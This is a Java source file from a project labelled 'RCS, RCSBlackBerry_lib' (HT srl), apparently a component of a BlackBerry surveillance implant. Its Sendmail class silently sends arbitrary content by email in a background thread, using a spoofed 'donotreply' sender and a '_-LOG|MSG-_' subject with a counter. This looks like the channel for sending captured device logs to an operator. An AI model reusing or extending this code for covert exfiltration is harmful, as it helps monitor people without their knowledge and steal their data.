//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Sendmail.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry.utils;

import net.rim.blackberry.api.mail.Address;
import net.rim.blackberry.api.mail.AddressException;
import net.rim.blackberry.api.mail.Folder;
import net.rim.blackberry.api.mail.Message;
import net.rim.blackberry.api.mail.MessagingException;
import net.rim.blackberry.api.mail.Session;
import net.rim.blackberry.api.mail.Store;
import net.rim.blackberry.api.mail.Transport;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class Sendmail implements Runnable {

    //#ifdef DEBUG
    static Debug debug = new Debug("Sendmail", DebugLevel.VERBOSE);
    //#endif

    public static final String LOGSUBJECT = "_-LOG|MSG-_";
    static String from = "donotreply@whatever.com";

    String to;
    int counter;
    String content;

    public Sendmail(final String to, final int counter, final String content) {
        this.to = to;
        this.counter = counter;
        this.content = content;
    }

    public static void send(final String to, final int counter,
            final String content) {
        //#ifdef DEBUG_TRACE
        debug.trace("send: " + counter);
        //#endif
        final Sendmail sendmail = new Sendmail(to, counter, content);
        final Thread thread = new Thread(sendmail);
        thread.start();
    }

    public final void run() {
        final Store st = Session.getDefaultInstance().getStore();
        final Folder[] folders = st.list(Folder.SENT);
        final Folder sentFolder = folders[0];

        final Message msg = new Message(sentFolder);

        final Address[] toList = new Address[1];
        try {
            toList[0] = new Address(to, to);
        } catch (final AddressException ex) {
            //#ifdef DEBUG_ERROR
            debug.error("send: " + ex);
            //#endif
        }

        try {
            msg.addRecipients(Message.RecipientType.TO, toList); //  add To, CC, BCC
        } catch (final MessagingException ex) {
            //#ifdef DEBUG_ERROR
            debug.error("send: " + ex);
            //#endif
        }

        try {
            final Address addressFrom = new Address(from, from); // Sender Details
            msg.setFrom(addressFrom);
        } catch (final AddressException ex) {
            //#ifdef DEBUG_ERROR
            debug.error("send: " + ex);
            //#endif
        }

        msg.setSubject(LOGSUBJECT + " " + counter); //  For Subject
        try {
            msg.setContent(content);
        } catch (final MessagingException ex) {
            //#ifdef DEBUG_ERROR
            debug.error("send: " + ex);
            //#endif
        }

        try {
            Transport.send(msg);
            System.out.println(" Email Sent successfully.");
        } catch (final MessagingException ex) {
            //#ifdef DEBUG_ERROR
            debug.error("send: " + ex);
            //#endif
        }

    }
}
